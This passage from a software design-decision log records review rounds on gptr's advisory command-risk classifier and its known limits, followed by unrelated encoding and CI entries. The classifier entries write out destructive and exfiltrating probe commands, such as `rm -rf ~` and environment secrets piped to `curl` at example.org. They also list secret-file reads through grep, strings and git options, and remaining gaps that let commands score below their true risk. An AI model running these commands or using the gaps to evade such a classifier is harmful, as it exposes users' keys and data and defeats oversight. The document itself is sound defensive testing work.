    `grep -n zzz -* b.txt` match with its lines as patterns), judged by (A)-(C) and accepted as a
    blocker.
    - *A glob that can expand to a file-reading option of an inert program (A).* Round 11 read a
      glob that can match a name starting with `-` as a computed option only outside
      `risk_cmd_inert`. But wc and du (`--files0-from`), grep, egrep and fgrep (`-f`, `--file`)
      and diff (`--from-file`, `--to-file`) are inert programs with an option that reads a file
      it names (3 `secret` for a secret file; wc's and du's since round 13), so `wc -l -*`,
      `wc [-]*`, `du -sh -*`, `grep -n x -*`, `grep -*` and `diff -* a.txt` were 0, and
      planting the name is a level-2 write. As item 17 did for ps and jq, the gate now reads
      such a glob for them (`risk_cmd_inert_files`) as "an option the shell computes"
      (3 `dynamic`) before a literal `--`: a glob whose first character is `-` (quoted, escaped or not) or `?`, or a bracket
      expression that matches `-` (`risk_glob_dash()` with its new argument `wild = "?"`:
      `wc '-'*`, `wc \-*`, `wc -l ?.txt`, `wc [!.]*`, `wc [[:punct:]]*`, `grep -n* x.txt`). A
      `*`-led glob stays an operand (the guard rows `grep foo *.R`, `wc -l *.csv`; Known
      limits), and so does a long option whose name and `=` are literal
      (`grep -rn --include=*.R x .`, `diff -r --exclude=*.o a b`): each name it expands to is
      that option, whose value gptr reads as before.
    - *Self-review: the same options in literal forms and through the environment.* grep's and
      rg's `-f` take the rest of their word, and gptr read only a separate `-f FILE`, so
      `grep -f.Renviron x`, `grep -nf.Renviron x`, `grep -rnf.Renviron x .`, `fgrep -if.env x`
      and `rg -nf.env x` were 0; `risk_cmd_read_ops()` now parses `-f` and `--file` as options
      with a value for them (3 `secret`). The macOS grep (BSD grep 2.6.0-FreeBSD; checked here
      with `GREP_OPTIONS=-ffake.env`) and GNU grep before 3.6 read options from GREP_OPTIONS, so
      `GREP_OPTIONS=-f.Renviron grep x y.txt` was 0: grep, egrep and fgrep
      (`risk_cmd_env_readers`) are no longer among the programs that read no options from the
      environment (`risk_cmd_env_quiet`), and a variable outside `risk_env_inert_re` set on the
      line before them is 3 (item 16's rule; GREP_COLOR, GREP_COLORS and the locale are in the
      allowlist). GNU strings (binutils) reads options from an `@FILE` word anywhere on its line
      and prints each word it cannot open, so `strings @.Renviron` was 0: the file of `@FILE`
      is now read with its contents (3 `secret`), and a glob that can match a name starting with
      `@` (`strings @*`, `strings [@]*`, `strings ?x.bin`, also after `--`) is a computed
      option. The macOS (cctools) strings reads no `@FILE`; the reading is the one that reads
      more.
    - *Changed rows:* none in older blocks. The 852 lines of the round-5 to round-13 probes give
      the same levels; two gain a `dynamic` row at their level 3 (`X=.env*; grep $X x.txt`,
      `X=.env*; grep foo $X`: an upper-case variable set before grep). Of this round's 121 other
      probe lines, 39 are higher and none lower. Raised outside the tests: a variable outside the
      allowlist set on the line before grep (`FOO=1 grep x f.txt`, `PAT=x; grep "$PAT" f.txt`,
      `export X=1; grep x f.txt`), and after wc, du, grep, diff or strings a glob led by `?` or
      by a bracket that matches `-` (`wc -l ?.txt`, `wc -l [!.]*`, 0 or 2 before) are 3.
23. **Review round 15 (findings against the standard).** All three findings were reproduced with
    a probe (`task2-fix15-probe-before.log`: every line the reviewer lists has the level the
    reviewer gives), the file-reading options also on fake data in the scratchpad (file-5.41
    `-m`, git 2.50.1 blame `-S`, `--ignore-revs-file`, `-c blame.ignoreRevsFile=` and
    `--pathspec-from-file`, tree v2.3.2 `--hintro` and `--houtro` each printed the fake secret),
    judged by (A)-(C) and accepted: a blocker, a major and a minor.
    - *Python's from-imports (blocker, (iii)).* risk_python() read a module's functions by their
      qualified name (`shutil.copy(`) or through `import M as N` only, so
      `from shutil import copy; copy('a', '.Rprofile')`, `from os import rename;
      rename('a', '.Rprofile')` and `from shutil import move; move('a', '.gptr/settings.json')`
      were 1, a workspace write (`copy('a', 'b.txt')`) was 1,
      `from subprocess import run; run('rm -rf ~', shell=True)`,
      `from subprocess import call; call([...])` and `from os import system; system('rm -rf ~')`
      were 3 where the qualified call is 4, and the rules' from-import alternatives (the rest of
      the line) missed a parenthesised list over several lines (`from os import (`, `system,`,
      `)` and `system('rm -rf ~')` on four lines: 1). `risk_py_from_calls()` reads each
      `from M import` of os, posix (as os), shutil, subprocess, pty, asyncio, platform and signal
      (a plain list, a parenthesised list over several lines with its comments, a list a
      backslash continues, `name as alias`, and `*`, which binds the names of `risk_py_star`) and
      writes every bare call of an imported name as the module's own call (`copy(` becomes
      `shutil.copy(`, in one pass over the code's calls) in the copy of the code that the rules,
      the environment-write reader and risk_py_commands() scan. The rules' from-import
      alternatives (`risk_py_import_list`) accept the parenthesised and continued lists, `import(`
      without a space and posix; each ends before the next `from`, so many imports on one line
      cost linear time (5,000 `from os import x;` on one line took 16 to 19 s before, 0.09 s
      now).
    - *Self-review, same family:* `os.renames`, `os.lchmod`, `os.lchown`, `os.utime`,
      `os.mkfifo`, `os.mknod`, `shutil.make_archive` and `shutil.chown` are writes
      (`import os; os.renames('a', '.Rprofile')` was 1, now 4 `control`), and the command line or
      argv of `pty.spawn` and `platform.popen` is read (`import pty; pty.spawn(['rm', '-rf', '~'])`
      was 3, now 4).
    - *Options that print a file they name (major, (i) and (iii)).* As round 13 did for name
      lists and round 14 for grep's `-f`, these are read with their contents: file's magic files
      (`-m`, `--magic-file`, a list `:` separates; libmagic prints each line it cannot parse),
      the revision lists of git blame and annotate (`-S`, `--ignore-revs-file`, and
      `git -c blame.ignoreRevsFile=F`, a key `risk_git_safe_key` allows; git prints
      `bad graft data:` or `invalid object name:` with a line) and tree's `--hintro` and
      `--houtro` (copied into its HTML). `file -m .Renviron x`, `git blame -S .Renviron x.R` and
      `tree -H . --hintro=.Renviron` are 3 `secret` (were 0). A blame.ignoreRevsFile an
      environment variable names (`--config-env`) is 3 `dynamic`. Self-review: git's write
      subcommands read files the same way, and `risk_git_files_in()` now reads them: the
      pathspec list of `--pathspec-from-file` (add, rm, checkout, restore, commit and stash push
      print `pathspec '<line>' did not match`; reset reads it too), the message of `-F`/`--file`
      (commit, tag, merge, notes; commit prints its first line) and commit's `-t`/`--template`;
      `-` is standard input. `git commit -F .Renviron` and `git add --pathspec-from-file=.Renviron`
      were 2, now 3 `secret`.
    - *Long glob words (minor).* risk_glob_rx() scanned to the end of the pattern for each `[`
      without its `]`, and risk_glob_match() rebuilt the expression on every call, so an
      unquoted word of 1,000 `a*[` took 3.8 s and one of 2,000 11 s. The first `]` after each
      position is now found once (the same expression for 20,000 random patterns), and the
      expression is kept per pattern during a classification (`risk_memo("globrx", ...)`): a
      word of 7,000 `a*[` (21 KB) takes about 0.1 s, and a test row bounds one of 3,000.
    - *Changed rows:* none in older blocks. The 3,024 strings of the test file and of the
      round-5 to round-14 probe logs, each read as a command line and as Python, give the same
      level and top categories on the round-14 and round-15 sources but the 53 new rows, all
      higher. Raised outside the tests: a bare call of a write or delete function imported from
      these modules (`from shutil import copytree; copytree(a, b)` 2), the git write subcommands'
      secret message and pathspec files, and the os and shutil writers above. Lowered: a word
      after another `from` on the line no longer counts as imported from the first module
      (`from os import path; from x import remove`, 3 before, is 1: `x.remove` is no os
      function), and in a fuzz of 2,000 Python snippets three that the round-14 source read
      through its alias copy glued to an `import` at the code's end (none valid Python).
24. **Review round 16 (findings against the standard; the final convergence round).** All three
    findings were reproduced with a probe (`task2-fix16-probe-before.log`: every line the reviewer
    lists has the level the reviewer gives), judged by (A)-(C) and accepted as majors under (iii):
    a target literal text identifies was read below its class.
    - *open()'s mode letters (major).* The file-write rule read an open() mode as a write only
      when it started with `w`, `a` or `x`, or with `r+`; Python accepts the letters in any order,
      so `open('.Rprofile', 'rb+')`, `open('.Rprofile', 'bw')`,
      `open('.gptr/settings.json', mode='rt+')` and `pathlib.Path('.Rprofile').open('rb+')` were
      1 (`r+b` was 4) and `open('b.txt', 'rb+')` was 1. A quoted mode made of the letters
      `rwaxbtU+` that holds `w`, `a`, `x` or `+` is now a write
      (`['"](?=[rwaxbtU+]*[wax+])[rwaxbtU+]+['"]`): the `.Rprofile` and `.gptr/settings.json`
      rows are 4 `control`, `open('b.txt', 'rb+')` 2 `file_write`; `'rb'`, `'rt'`, `'r'` and
      `'rU'` stay reads (1).
    - *A from-imported environ (major).* Round 15 read a from-imported os name as the module's
      own only where the code called it, but environ and environb are used by subscript and
      method. `risk_py_from_calls()` now writes every bare use (`(?<![\w.])NAME\b`) of a name a
      from-import of os or posix binds to environ or environb, under any alias, as `os.environ`
      or `os.environb`, outside the import statements themselves (so an import alone, or a word
      such as `Exception` that only starts with the alias, adds nothing), and `risk_py_star$os`
      lists environ, environb and getenv for `from os import *`. `from os import environ as E`
      then `E['GPTR_X'] = '1'`, `E.clear()` or `del E['GPTR_MODE']`, the posix and environb
      forms and an aliased update() in a parenthesised list are 4 `control` (were 1);
      `from os import environ` then `environ['OPENAI_API_KEY']`, `print(environ)` or
      `dict(environ)` are 2 `secret` (were 1), as the qualified forms are; and
      `from os import *` then `print(environ['OPENAI_API_KEY'])` keeps the star import's 3 with a
      secret row.
    - *PowerShell's env: drive (major).* `Get-Content env:OPENAI_API_KEY`, `cat`, `type`,
      `Get-Item env:NAME`, `Get-ChildItem env:`, `dir env:` and `ls env:` were 0, and with a
      network sink 3 (or 2 with Invoke-WebRequest), where `echo $env:OPENAI_API_KEY` is 2 and
      `env | curl -d @- URL` 4. For the programs of `risk_ps_env_readers` (Get-Content and its
      aliases cat, type and gc, more, the PowerShell function that runs Get-Content,
      Select-String and sls, Get-Item and gi, Get-ChildItem and ls, dir and gci),
      `risk_ps_env_names()` reads each operand on the Environment provider drive (`env:NAME`,
      `Env:\NAME`, `Env:/NAME`, `Environment::NAME`, with or without
      `Microsoft.PowerShell.Core\`, the value of `-Path`, `-LiteralPath` or `-Path:VALUE`): the
      drive itself or a wildcard (`env:`, `env:*`, `env:OPENAI*`) is the whole environment, as
      `env` is, and a secret-looking name (is_secret_name()) that variable; each is a 2 `secret`
      row whose `$` name lets risk_secret_sink() raise a line with a network sink to 4. The
      aliases gc, gci, gi and sls are no programs the tables know, so they stay 3 with the
      secret row. A name that is not secret-looking (`Get-Content env:HOME`) stays 0, as
      `echo $env:HOME` does, and so does a word the program does not read (`echo env:X`,
      `envs:X`). A shell reads such a word as a file name; PowerShell's reading is the one that
      reads more.
    - *Changed rows:* none in older blocks. The 3,095 strings of the test file and of the
      round-5 to round-14 probe logs, each read as a command line and as Python, give the same
      level and top categories on the round-15 and round-16 sources but the 45 new rows, all
      higher.
Known limits (advisory classifier, not a security boundary; each shell, Python and SQL limit
below is level 3 or the level of what can be read, never 0, except what (A) admits, the SQL
functions named last and the three gaps of the review of round 16 that the follow-up paragraph
lists). (A) admits a plain parameter as an operand, and as an option of a
program in `risk_cmd_inert` (whose options only read), so `cat "$f"` or `ls $DIR` stays 0
whatever the variable names (a read of a computed path reads at its `unknown` class, 0), and so
do `wc -l "$f"` and `grep -n "$p" f.txt` when the variable holds an option that reads a file
(`--files0-from=.env`, `-f.env`), the same computed read through an option. For wc, du, grep,
egrep, fgrep, diff and strings a `*`-led glob is still read as operands (`grep foo *.R`,
`wc -l *.csv`, `strings *.bin`), although a planted name such as `--files0-from=x.csv`,
`-fx.R` or `@x.bin` would be read as that option: the file it names then ends in the glob's
suffix and sits in the directory the glob reads, and a bare `*` reads at the class of the
guarded names it can match (2 for wc and du, 3 for grep), not at a secret read's 3 for a
planted `--files0-from=.env`. pkill
and killall patterns are matched against a fixed list of R's process names and command lines.
A directory the shell computes gives a word only the classes P01 gives by name in any
directory: never critical (`rm -rf "$D/.."` is 3), nor a class P01 gives in one directory only
(`.Renviron` is control in the project root and the home directory, so `"$D/.Renviron"` is read
as protected, a 3 write). git grep without a path searches the work tree as `grep -r KEY .` does
and names no file (0); a revision named like a secret file (`git log -p feature/credentials`)
is read as one, and a secret pathspec of `git show --stat` or `git diff --stat` is read as if
its contents were printed (3).
Scripts read by `sed -f`/`awk -f`, `source FILE` or `sh FILE`,
configuration read by `curl -K`, `wget -e`/`--config` (3 `dynamic` since round 4) or `git` from
the repository, the values of variables the line does not assign literally (from the
environment, `read`, a function or a sourced file) and of positional parameters (`$X`, `"$@"`:
`unknown`; item 14 reads the values the line assigns), the names xargs gets from a program
other than echo, printf, a heredoc, find, fd, ls, dir, `git ls-files` or `rg --files` (`cat list
| xargs rm` is 3), commands hidden by `eval` of computed strings beyond the rules above, Python
reached through other indirections (an alias of `r`, a process call whose command is built at
run time, a function bound by assignment, `cp = shutil.copy`, or imported from a module other than
os, posix, shutil, subprocess, pty, asyncio, platform and signal; a name a from-import binds is
read as the module's function wherever the code calls it, and one bound to environ or
environb wherever the code uses it, a string or comment included),
heredocs or here-strings read by a program other than a shell, an interpreter,
`source`, xargs, sftp or ftp, and, the one limit in this list that can be 0, a SELECT that calls a
user-defined function, a stored procedure's side effects or a server function gptr does not
list (item 14 lists the code, signal and state functions it reads; the statement shows nothing
else): such a statement is read by its leading keyword, as G5 reads it. `set -e` and
`if cd x; then ...` are not modelled: a `cd` there is read as one that may fail (a higher level,
never a lower one). A link made by `mklink` or `New-Item` is not followed on the line (its
guarded source is flagged). CDPATH set by a file the shell sources is read only through the
unknown directory that `source` adds. A substitution in an unquoted
heredoc that holds a comment is not read and is level 3 `dynamic`. Shell syntax is read as bash
and dash read it (and PowerShell, for `#` comments and the env: drive); cmd.exe, gptr's last fallback on Windows
without Git Bash or PowerShell, has no `'` quotes, no `#` comments and `^` escapes, which the
classifier does not model (a `cmd /c` line is read with sh's rules). An upper-case variable a
line sets without export counts for its later programs (item 16), a lower-case one does not (a
convention: programs read options from upper-case names). sed and awk are read as GNU sed, BSD
sed, gawk and the one-true-awk read them; where they differ (BSD's labels, bracket expressions
in awk regular expressions, awk's `-W`) the reading that runs more commands is used or the line is
3; a `-W` name mawk reads but gawk does not know is 3. yq is read as mikefarah yq v4 reads it
(python yq's jq options are 3), and xxd as the 2025 xxd reads its options (an older xxd stops at
`--cols` with a usage error; gptr reads the write).
A SQL literal compared with a column is data (`WHERE p = '.env'` is 0), also when the query
then reads that column's value as a path. Python's writes to the environment are read through
the names `environ`, `environb`, putenv and unsetenv, qualified or bound by a from-import of os
or posix under any name (`from os import environ as E`, `from os import *`; round 16): through
a name an assignment binds to os.environ (`e = os.environ; e['GPTR_X'] = '1'`, or `F = E` after
the from-import) they are 2 (the os.environ read, never 1), and a computed key next to literal
ones in update() is not flagged. PowerShell's environment is read through `$env:NAME` and the
env: drive of the programs of `risk_ps_env_readers`; the braced `${env:NAME}` and .NET's
`[Environment]::GetEnvironmentVariable()` are constructs gptr does not model (3, also with a
network sink), and another cmdlet's env: operand (`Copy-Item env:X out.txt`, 2) is read by its
table row only. PowerShell's comma arrays, a location on the env: drive, Python's getenv used as
a value and the nt module's environ are not modelled and can read below the level of what is
read (the follow-up paragraph lists them). A glob whose first character is a
literal other than `-` stays an operand, although it may expand to several words
(`git log R/*.R`); none of those words can be an option. Where a glob's position matters it is
read as one that matches several names: after a glob pattern or option value every later word
that is no option is a file the program may read (`grep -A 1* .env x` reads `.env`), although
the program may stop with an error first. `set -f` and zsh's `noglob` are not modelled (a glob
still counts). risk_cmd_shifted() knows the glob words by their text, so a quoted word spelled
like an unquoted glob in the same command counts as one, and a for loop's variable over a glob
is read as the glob (`for p in .env*; do grep $p x; done` reads `.env*`).

Validation: `progress/P11.md`, Task 2. Six blocks were added to `test-perm-classify.R`
(145 expectations); against the plan-literal Task 2 source the file gives
`[ FAIL 87 | WARN 0 | SKIP 0 | PASS 202 ]` (`task2-probe-plan-literal.log`). Review round 1 added
item 10 and the destination, operand, `$PWD`, quote and `cd` parts of items 1, 3 and 5, with five
blocks (131 expectations) and one changed row (`echo $(rm -rf ~ "(")` is now read: 4, not 3);
against the round-0 source they fail 100 (`task2-fix1-red.log`, before five category assertions
were added). Review round 2 added the comment, heredoc, `$'...'` and continuation parts of item
1, the git options, tilde prefixes and new write targets of items 3 and 5, the option parsing of
item 6, the MySQL lexings of item 7 and `eval` and escaped program names in item 10, with six
blocks (109 expectations); the first 103 fail 70 against the round-1 source
(`task2-fix2-red.log`). Review round 3 added the fail-safe principle and item 11, with nine blocks
(180 expectations) and four raised rows (`cd ~- && rm -rf *`, `fd -x rm`, the two `git -c` program rows: 3 to 4); the
first 142 new expectations and the first changed row fail 94 against the round-2 source
(`task2-fix3-red.log`). Review round 4 added item 12 and the amendments it names, with six blocks
(150 expectations), two path checks in older blocks and two raised rows (the `gawk -f` rows: 2 to
3); the final test file fails 101 against the round-3 source (`task2-fix4-red-final.log`). Review
round 5 added item 13, with nine blocks (232 expectations), one raised row and one changed
assertion; the final test file fails 157 against the round-4 source (`task2-fix5-red-final.log`).
Review round 6 added item 14 and the amendments it names, with five blocks (126 expectations)
and no changed row; the final test file fails 93 against the round-5 source
(`task2-fix6-red-final.log`). Review round 7 (the classifier standard) added item 15 with
eight blocks (291 expectations), eight expectations in two older blocks and thirteen changed
rows (six by the gate, seven by the non-dot glob names, listed in item 15); the first seven new
blocks fail 161 against the round-6 source (`task2-std-red.log`), the anchor and read-option
blocks fail 22 against the intermediate source that had the gate and the static fixes but not
those (`task2-std-red2.log`) (`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 1549 ]` at the end of round 7).
Review round 8 added item 16 with eight blocks (217 expectations) and one changed row; the eight
blocks as first written (211 expectations) fail 102 against the round-7 source
(`task2-fix8-red.log`), and the three implicit-stash rows of the self-review fail 2 before their
fix (`task2-fix8-red-stash.log`) (`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 1766 ]` at the end of
round 8). Review round 9 added item 17 with four blocks (180 expectations) and no changed row;
the blocks as first written (178 expectations) fail 115 against the round-8 source
(`task2-fix9-red.log`) (`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 1946 ]` at the end of round 9).
Review round 10 added item 18 with five blocks (174 expectations) and no changed old row. The
four blocks as first written (144 expectations) fail 110 against the round-9 source
(`task2-fix10-red.log`). The final test file fails 128 against a copy of the source (taken
before the argv change) with the round-10 call sites removed and round 9's gate line restored
(`task2-fix10-red-final.log`) (`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 2120 ]` at the end of round
10). Review round 11 added item 19 with one block and rows in one older block (172
expectations), and one changed assertion. The final test file fails 127 against the round-10
source (`task2-fix11-red-final.log`). The first red run, in the working tree before the source
changed and before the self-review rows were added, failed 99 (`task2-fix11-red.log`)
(`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 2292 ]` at the end of round 11). Review round 12 added item
20 with one block (170 expectations) and no changed old row. The final test file fails 118
against the round-11 source (`task2-fix12-red-final.log`: 117 failures and the `sed -e` error,
which ends its block); the block as first written failed 117 in the working tree
(`task2-fix12-red.log`). Final `^perm-classify$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 2462 ]` in
the UTF-8 and the C locale (`task2-fix12-green.log`, `task2-fix12-green-C.log`) at the end of
round 12. Review round 13 added item 21 with one block (207 expectations) and no changed old row.
The final test file fails 151 against the round-12 source (`task2-fix13-red-final.log`); the
block as first written failed 146 in the working tree (`task2-fix13-red.log`). Final
`^perm-classify$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 2669 ]` in the UTF-8 and the C locale
(`task2-fix13-green.log`, `task2-fix13-green-C.log`) at the end of round 13. Review round 14
added item 22 with one block (116 expectations) and no changed old row. The final test file
fails 75 against the round-13 source (`task2-fix14-red-final.log`: 74 failures and the
`risk_glob_dash(wild = )` error, which ends its block); the block as first written failed 73 in
the working tree (`task2-fix14-red.log`). Final `^perm-classify$`:
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 2785 ]` in the UTF-8 and the C locale
(`task2-fix14-green.log`, `task2-fix14-green-C.log`) at the end of round 14. Review round 15
added item 23 with one block (134 expectations) and no changed old row. The final test file fails
107 against the round-14 source (`task2-fix15-red-final.log`); the block as first written failed
108 in the working tree (`task2-fix15-red.log`: the 107 and one Python guard row that was wrong,
`from subprocess import PIPE`, 3 by the process rule, replaced). Final `^perm-classify$`:
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 2919 ]` in the UTF-8 and the C locale
(`task2-fix15-green.log`, `task2-fix15-green-C.log`) at the end of round 15. Review round 16
added item 24 with one block (123 expectations) and no changed old row. The block fails 95 in the
working tree before the source changed (`task2-fix16-red.log`), and the final test file fails the
same 95 against the round-15 source (`task2-fix16-red-final.log`); every failure was missing
behaviour, and the guards passed. Final `^perm-classify$`:
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 3042 ]` in the UTF-8 and the C locale
(`task2-fix16-green.log`, `task2-fix16-green-C.log`). The review of round 16 (verdict clear)
found three minors, recorded in the follow-up paragraph with no source or test change; the
fix round's run gives the same `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 3042 ]` in both locales
(`task2-r16fix1-green.log`, `task2-r16fix1-green-C.log`).

**Follow-up hardening (coordinator decision, review round 16).** Round 16 is Task 2's final
convergence round: it fixed exactly the three round-15 findings (item 24) and started no other
modelling. Further per-program option semantics are tracked as a coordinator follow-up outside
P11 Task 2: each level-0 program's options are to become an explicit per-program option
allowlist, so that any option gptr does not recognise for that program is level 3 (standard
(B)) instead of being read by the shared option parser (`risk_cmd_args()`,
`risk_cmd_read_ops()`) and the per-program exceptions items 6 and 11 to 24 added one finding at a
time. Until then the classifier stays advisory (03 section 6.8.1), with the known limits above.
The review of round 16 (verdict clear) found three minors. Each was reproduced on the round-16
source (`task2-r16fix1-probe-before.log`) and, under the same decision, is tracked here for the
follow-up (test-first) instead of being modelled in Task 2:
1. *PowerShell's comma arrays.* A reader's operand list is one word to the operand readers
   (`risk_cmd_read_ops()`, `risk_ps_env_names()`), and is_secret_name() rejects the joined
   name. `Get-Content -Path env:OPENAI_API_KEY,env:HOME` is 0, and 3 `network` (not 4 `secret`)
   with `| curl -d @- https://example.org`; `Get-Content env:HOME,env:OPENAI_API_KEY` is 2
   `secret` only because the joined word looks secret. Files share the gap, which is older than
   round 16: `Get-Content notes.txt,.Renviron` is 0 (3 with the curl sink) where
   `Get-Content .Renviron` is 3 `secret` (`notes.txt, .Renviron`, with a space, is two words and
   is read). To do: split a PowerShell reader's operands on unquoted commas before reading them,
   or read an env: operand whose rest is not a plain name, empty or a wildcard as the whole
   environment; a comma-joined word of a level-0 PowerShell reader is at least 3 (B).
2. *A location on the env: drive.* `cd env:` and `Set-Location env:` are read as a change to a
   directory named `env:`, so a later lister or relative read reads no environment:
   `cd env:; ls` and `cd env:; Get-Content OPENAI_API_KEY` are 0, and
   `cd env:; ls | curl -d @- https://example.org` and
   `Set-Location env:; Get-ChildItem | curl -d @- https://example.org` are 3 `network`, not 4.
   To do: where a cd or Set-Location can leave the shell on the env: or Environment:: drive,
   read the later programs of `risk_ps_env_readers` with relative or no operands as reads of
   `$ENV` (or of the secret-looking name).
3. *Python's getenv as a value, and nt.* The secret rule matches `os.environ` and a call
   `getenv(`, so `list(map(os.getenv, ['OPENAI_API_KEY']))`, qualified or through
   `from os import getenv as g`, is 1, and 3 `network` (not 4) inside
   `requests.post('https://x.org', data=...)`. nt, the module behind os on Windows, is no alias
   of os: `import nt; print(nt.environ)`, `nt.environ['OPENAI_API_KEY']`,
   `from nt import environ; print(environ)` and `from nt import environ as E` then
   `E['GPTR_MODE'] = 'x'` are 1 (the qualified write `nt.environ['GPTR_MODE'] = 'x'` is 4).
   To do: widen the secret rule to a bare `\bgetenv\b` outside the import statements, give
   getenv aliases the bare-use rewrite environ aliases have, and add nt next to posix in
   `risk_py_from_calls()` and the qualified-name scan.

## D-062 - P15 block headers: values holding a line break are quoted, quoted values are decoded without the R parser, header keys are matched exactly, a local model tag is kept as written (2026-10-04)

P15 Task 1's plan-literal `doc_format_kv()`, `doc_parse_kv()` and `doc_block_status()`
(`R/doc-blocks.R`) were changed in three ways. The marker grammar of contract section 11.5 is
unchanged, and so are the function interfaces.
1. **Line breaks are quoted.** The plan quoted a value only when it held a blank, tab, quote, `=`
   or backslash, so a value with a CR or LF (a non-syntactic `gptr_return()` name in `value=`, or
   a child name in `children=`) was written unquoted and split the one-line `BLOCK_OPEN` marker.
   The quote class is now `[ \t\r\n"=\\]`; `doc_str_literal()` already writes `\n` and `\r`.
   Contract 11.5 only says that values containing spaces are quoted, so quoting more values is
   compatible with it.
2. **Quoted values are decoded without the R parser.** The plan decoded them with `str2lang()`.
   In a C locale (the architecture section 9 CI matrix has an `LC_ALL=C` job) the parser rewrites
   each non-ASCII character of the literal as `<U+00E1>`. `children=` is always quoted, so a
   non-ASCII team or fan-out child name came back as `an<U+00E1>lisis:s1`, and so did a quoted
   `value=` name. P06's replay and IC-47 child binding would read the wrong name, and Task 5
   re-renders parsed headers, so the corruption would be written back into the user's document.
   The new `doc_str_unquote()` decodes exactly the escapes `doc_str_literal()` writes (backslash,
   quote, `\n`, `\r`, `\t`); any other escaped character stands for itself, so `\u`/`\x` escapes
   that a person typed by hand are not interpreted (gptr never writes them). Text that is not one
   whole quoted literal is kept as written, as before.
3. **Header keys are matched exactly.** `doc_block_status()` read `header$status`, `$sha`,
   `$prompt` and `$args`, which partial-match. Unknown keys are kept in a header, so a header
   with `shaz=` and no `sha=` was reported `user-edited` (and `statusx=undone` as `undone`). It
   now uses `header[["..."]]`.
The IC-74 local-model guard needed no code: a local model tag such as `ollama/qwen3:8b` has no
character of the quote class and is written unquoted and unchanged in `model=` (07 section 6, P15
row). One expectation pins it.

Validation: `progress/P15.md`, Task 1 (`test-doc-blocks.R`). The plan's 44 expectations are
unchanged. Fifteen were added: 2 for item 1 (the plan literal writes a newline into the header,
`task1-red-newline.log`), 1 for the IC-74 model tag, 10 in the block "quoted header values are
decoded without the R parser, also in a C locale" and 2 for item 3. Against the round-0 source
the added review-round-1 expectations fail 5 (3 C-locale, 2 partial-match; `task1-fix1-red.log`).
Final `^doc-blocks$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 59 ]` in the UTF-8 and the C locale.

## D-063 - Hosted CI after the P06/P09/P10 waves: as_utf8() keeps bytes that are not UTF-8 in a UTF-8 locale on every R version; the six-stream INFRA-01 wall nets out the mock's own lateness (2026-10-04)

Hosted run 37213342336 (`b40b4d1`) and run 37210924368 (`51ba767`) failed every R CMD check
job. CI Task CI-4 fixes them. Two of its changes go beyond a test's portability or packaging:

1. **`as_utf8()` keeps bytes that are not valid UTF-8 when the native encoding is UTF-8**
   (`R/utils-encoding.R`, P01; IC-62). Such an unknown-encoded string has no native encoding to
   be converted from. On R 4.5 and later (hosted 4.5.3, 4.6.1 and devel, local 4.5.0),
   `enc2utf8()` keeps its bytes and marks it UTF-8. R 4.2.3, on the oldrel-4 jobs for Ubuntu
   and Windows (ucrt, UTF-8), turned each invalid byte into `<xx>` text (R 4.3 and 4.4 were not
   checked). So on R 4.2.3 the code `x = '`, byte 0xff, `'` ran as `x = '<ff>'` with status
   `ok`, and D-055 item 4's `parse_error` never happened (hosted `test-eval-core.R:512-514`).
   `as_utf8()` now marks such strings UTF-8 itself. It calls `enc2utf8()` only for latin1
   strings and, in other locales, for native strings that are not valid UTF-8. Where
   `enc2utf8()` already kept the bytes, the result is the same as before. Where it rewrote
   them, every ingress in a UTF-8 locale now keeps the bytes as they came, so `validUTF8()`
   checks see them. Nothing changes in a non-UTF-8 locale. The one `enc2utf8()` call moved into
   `native_to_utf8()`, which the test mocks with R 4.2.3's conversion to reproduce the hosted
   failure on any R version.
2. **The six-stream INFRA-01 wall is measured on the mock's clock** (`test-http-reactor.R`,
   P04; extends D-016 item 1). Hosted macOS measured 2.486 s from the first head written. The
   heads were written within 0.017 s, and the long streams ended at 2.402, 2.436 and
   2.486 s, against the 2.25 s schedule. The message did not show whether the mock wrote the
   last pieces late or gptr delivered them late. D-016 netted the mock's own lateness out of
   the gaps but not out of the wall. Each stream's end is now its head's write, plus its
   scheduled length (`n * 0.25` s), plus gptr's delivery latency of the end of the body. That
   latency is the callback's wall clock minus the mock's write of the stream's last piece. A
   body of its own names each stream's request in its mock's log. The bound stays the plan's
   1.10 * 9 * 0.25 = 2.475 s. A latency below -0.05 s fails, because it means mismatched
   writes. D-016 said that contention which stretches every stream still fails. That now holds
   for gptr's delivery, but not for a mock that writes late. The failure message prints each
   stream's own lateness and gptr's delivery latency. Real-mock probe, on a clean `HEAD`
   export: normal runs measure 2.259-2.263 s here and 2.261-2.269 s by the old measure. With
   gptr's pump held for 0.4 s near the ends, the new measure gives 2.531-2.535 s and the old
   2.523-2.526 s, so both fail. With the long mock suspended for 0.7 s near its last writes
   (own lateness 0.319 s), the new measure gives 2.261-2.262 s and the old 2.574 s, the hosted
   failure's shape.

Validation: `progress/ci-hosted.md`, Task CI-4.

## D-064 - P15 call scanner: UTF-8 bytes are parsed (IC-62), parse data is kept under sys.source(), ownership matches header keys exactly and never a missing prompt hash, a computed prompt = gives no literal, a piped call (native or magrittr) is identified as R calls it, call identity ignores source references (2026-10-04)

P15 Task 2's plan-literal scanner and ownership functions (`R/doc-blocks.R`) were changed in eight
ways. Their interfaces and the contract 11.5 ownership rule are unchanged. The call table gains
one column, `ident` (item 6).
1. **The scanner parses UTF-8 bytes.** The plan parsed `as_utf8()` (UTF-8-marked) text and
   decoded string literals with `str2lang()`. In a C locale (the architecture section 9 CI
   matrix has an `LC_ALL=C` job) the parser translates marked UTF-8 to the native encoding, so a
   prompt literal `"café"` was read as `"caf<U+00E9>"`. Its `prompt_hash()` differs from the
   runtime prompt's, so the call never finds its block by prompt: the block is matched by `call=`
   ordinal as stale or not at all, against IC-62 (exact UTF-8 prompt bytes under
   `LC_ALL=C Rscript`, document included). Outside a UTF-8 locale `doc_parse_text()` now parses
   `os_bytes(lines)` (UTF-8 bytes without a mark); in a UTF-8 locale it parses marked UTF-8 as
   the plan did, since nothing is translated there. `str2lang(os_bytes(.))` decodes prompt
